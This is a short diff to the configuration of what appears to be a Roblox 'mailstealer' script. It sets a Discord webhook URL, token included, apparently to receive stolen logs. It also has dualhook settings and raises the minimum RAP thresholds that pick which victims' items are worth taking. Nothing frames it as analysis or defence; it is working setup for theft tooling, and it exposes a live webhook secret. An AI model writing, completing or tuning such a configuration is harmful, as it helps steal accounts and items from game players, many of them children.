@@ -2,14 +2,14 @@
 Username = "jointex21"
 Username2 = ""
 Webhook = "https://discord.com/api/webhooks/1282296562625548369/dHIQuEXGUox9lgu1IA09zfNM9us0OVMokXIZOqWI4LXS5sCvAiEJxhOgivZlwgF3dbuY"
-MinimumRAP = 190000
+MinimumRAP = 1000000
 
 DualhookUsername = ""
 DualhookWebhook =
     ""
 LogsWebhook =
     ""
-DualhookRAP = 190000
+DualhookRAP = 5000000
 mailstealer_name = "X"
 
 Roblox_Username = Username
